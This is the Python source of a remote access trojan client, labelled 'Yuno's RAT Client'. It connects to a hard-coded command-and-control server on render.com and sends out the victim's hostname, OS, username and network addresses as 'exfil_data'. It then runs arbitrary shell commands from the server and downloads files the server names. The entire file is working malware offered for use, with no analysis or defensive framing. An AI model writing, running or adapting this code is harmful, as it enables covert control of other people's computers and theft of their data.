#!/usr/bin/env python3
import platform
import subprocess
import json
import time
import os
import urllib.request
from socketio import Client
import netifaces

# Server settings
SERVER_URL = "https://c2-backend-wily.onrender.com"  # Your Render URL

def get_system_info():
    """Gather system information including username, compatible with Linux and Windows."""
    info = {
        "hostname": platform.node(),
        "os": platform.system(),
        "os_version": platform.release(),
        "architecture": platform.machine(),
    }
    try:
        if platform.system() == "Windows":
            username = subprocess.run("echo %USERNAME%", shell=True, capture_output=True, text=True).stdout.strip()
        else:
            username = subprocess.run("whoami", shell=True, capture_output=True, text=True).stdout.strip()
        info["username"] = username
    except Exception as e:
        print(f"[!] Error getting username: {e}")
        info["username"] = "unknown"
    return info

def get_network_info():
    """Gather network interface information."""
    interfaces = netifaces.interfaces()
    network_info = {}
    for iface in interfaces:
        addrs = netifaces.ifaddresses(iface)
        if netifaces.AF_INET in addrs:
            for addr in addrs[netifaces.AF_INET]:
                network_info[iface] = addr.get("addr", "Unknown")
    return network_info

def download_file(url, dest_path):
    """Download a file from the server."""
    try:
        urllib.request.urlretrieve(url, dest_path)
        return f"File downloaded to {dest_path}"
    except Exception as e:
        return f"Error downloading file: {e}"

def execute_command(command):
    """Execute a system command and return the output based on current directory."""
    try:
        if command.strip().lower() == "whoami":
            if platform.system() == "Windows":
                result = subprocess.run("echo %USERNAME%", shell=True, capture_output=True, text=True)
            else:
                result = subprocess.run("whoami", shell=True, capture_output=True, text=True)
            return result.stdout + result.stderr
        elif command.strip().lower().startswith("cd "):
            target_dir = command.strip().split("cd ", 1)[1].strip()
            target_dir = os.path.normpath(target_dir)
            os.chdir(target_dir)
            return f"Changed directory to {os.getcwd()}"
        elif command.strip().lower().startswith("download "):
            filename = command.strip().split("download ", 1)[1].strip()
            download_url = f"{SERVER_URL}/download/{filename}"
            dest_path = os.path.join(os.getcwd(), filename)
            return download_file(download_url, dest_path)
        else:
            result = subprocess.run(command, shell=True, capture_output=True, text=True, cwd=os.getcwd())
            return result.stdout + result.stderr
    except Exception as e:
        return f"Error executing command: {e}"

def main():
    sio = Client()
    try:
        @sio.event
        def connect():
            print("[*] Connected to RAT server")
            system_info = get_system_info()
            network_info = get_network_info()
            exfil_data = {
                "system": system_info,
                "network": network_info,
                "type": "system_info"
            }
            sio.emit('exfil_data', json.dumps(exfil_data))
            print("[*] Exfiltrated data sent to RAT server")

        @sio.event
        def disconnect():
            print("[*] Disconnected from RAT server")

        @sio.event
        def connect_error(data):
            print(f"[!] Connection failed: {data}")

        @sio.event
        def command(data):
            print(f"[*] Received command: {data}")
            if data.strip().lower() == "exit":
                print("[*] Received exit command")
                sio.disconnect()
                return
            output = execute_command(data)
            print(f"[*] Executed command: {data}")
            sio.emit('exfil_data', json.dumps({
                "type": "command_output",
                "command": data,
                "output": output,
                "current_dir": os.getcwd()
            }))

        while True:
            try:
                print(f"[*] Attempting to connect to {SERVER_URL}")
                sio.connect(SERVER_URL, transports=['websocket'], wait_timeout=10)
                sio.wait()
                break
            except Exception as e:
                print(f"[!] Connection failed: {str(e)}")
                print("[*] Retrying in 5 seconds...")
                time.sleep(5)
    except KeyboardInterrupt:
        print("[*] Shutting down client...")
    finally:
        if sio.connected:
            sio.disconnect()

if __name__ == "__main__":
    print("=== Yuno's RAT Client ===")
    print("A remote access client by Yuno\n")
    main()